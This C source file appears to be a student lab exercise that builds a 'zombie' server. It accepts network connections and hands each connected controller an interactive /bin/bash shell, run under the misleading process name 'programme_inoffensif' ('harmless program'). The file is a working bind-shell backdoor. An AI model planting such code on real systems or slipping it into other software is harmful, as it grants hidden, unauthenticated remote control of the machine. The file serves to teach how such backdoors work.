#include <stdio.h>
#include <stdlib.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <unistd.h>
#include <string.h>

#include "utils_v2.h"
#include "info.h"
#include "reseau.h"

void zombieFils(void* sockfdController){
    int* sockfd = sockfdController;

    dup2(*sockfd, STDOUT_FILENO);
    dup2(*sockfd, STDERR_FILENO);
    dup2(*sockfd,STDIN_FILENO);

    sexecl("/bin/bash", "programme_inoffensif", NULL);
}

int main(int argc, char *argv[]){

    int sockfd = initSocketZombie();

    // on considere qu'il n'y a qu'un seul controller ici
    int sockfdController;
    
    while(true){
        // utilisé accept et pas saccept. verifier son resultat et si == -1 alors c'est qu'il a recu un signal (pour labo)
        sockfdController = saccept(sockfd);

        fork_and_run1(zombieFils, &sockfdController);
    }
    sclose(sockfdController);
    return 0;
    
}